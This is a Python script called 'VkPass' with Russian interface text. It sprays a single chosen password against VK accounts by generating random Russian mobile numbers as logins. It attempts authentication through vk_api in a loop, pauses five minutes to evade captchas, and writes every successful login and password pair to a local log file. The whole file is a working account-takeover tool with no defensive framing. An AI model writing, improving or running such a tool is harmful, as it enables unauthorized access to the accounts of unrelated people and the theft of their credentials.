import vk_api, random, time, colorama, os
os.system("clear")
os.system('toilet -f big -F gay "VkPass" ')
os.system('toilet -f big -F gay "PT - lub"')
print("Предстовляет VkPass")
i=0
codes = [900, 902, 903, 904, 905, 906, 908, 909,
         950, 951, 953, 960, 961, 962, 963, 964,
         965, 966, 967, 968, 969, 980, 983, 986,
         901, 904, 910, 911, 912, 913, 914, 915,
         916, 917, 918, 919, 950, 978, 980, 981,
         982, 983, 984, 985, 987, 988, 989, 920,
         921, 922, 923, 924, 925, 926, 927, 928,
         929, 930, 931, 932, 933, 934, 936, 937,
         938, 939, 950, 951, 999, 901, 952, 958,
         977, 991, 992, 993, 994, 995, 996, 998]
password = input("Пароль: ")
print("\033[32m[*] Нажми Enter и будет выбрано авто.\033[0m")
cod = input("7(xxx): ")
while True:
    if (password == "qwerty") or (password == "qwerty123"):
        print("")
        print("reCaptcha:\n - Hello ^_^! ")
        break
    elif (password == "") or (password == " "):
        print("")
        print("\033[31m[!] Write password.\033[0m")
        break
    if len(cod) != 3:
        cod = ""
    try:
        if cod == "":
            login = "7"+str(codes[random.randint(0, len(codes))])+str(random.randint(1000000, 9999999))
        else:
            login = "7"+cod[0]+cod[1]+cod[2]+str(random.randint(1000000, 9999999))
    except:
        print("Error creating login")
    try:
        vk_session = vk_api.VkApi(login, password)
        vk_session.auth()
        vk = vk_session.get_api()
        print("\033[32m[TRUE]>>> login: "+login+" : "+"Password: "+password)
        file = open("bd.log", "a+")
        file.write("login: "+login+" : "+"Password: "+password)
        file.close()
        i=0
    except:
        if i == 15:
            print("\033[35m[*] Ждем 5 мин чтоб небыло капчи :3 \033[32m")
            time.sleep(300)
            i=0
        else:
            print("\033[31m=> "+login+" for "+password+"\033[0m")
        i+=1